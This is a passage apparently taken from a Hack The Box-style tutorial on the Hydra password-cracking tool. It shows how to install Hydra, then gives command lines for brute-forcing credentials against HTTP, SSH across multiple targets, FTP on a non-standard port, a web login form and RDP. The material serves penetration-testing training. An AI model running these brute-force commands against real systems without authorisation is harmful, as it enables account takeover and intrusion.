...
```shell
3kjS@htb[/htb]$ hydra -h
```

```shell
3kjS@htb[/htb]$ sudo apt-get -y update 
3kjS@htb[/htb]$ sudo apt-get -y install hydra
```
## Basic Usage

```shell
3kjS@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```
...
```shell
3kjS@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
### Targeting Multiple SSH Servers

```shell
3kjS@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```
### Testing FTP Credentials on a Non-Standard Port

```shell
3kjS@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
### Brute-Forcing a Web Login Form

```shell
3kjS@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
### Advanced RDP Brute-Forcing

```shell
3kjS@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
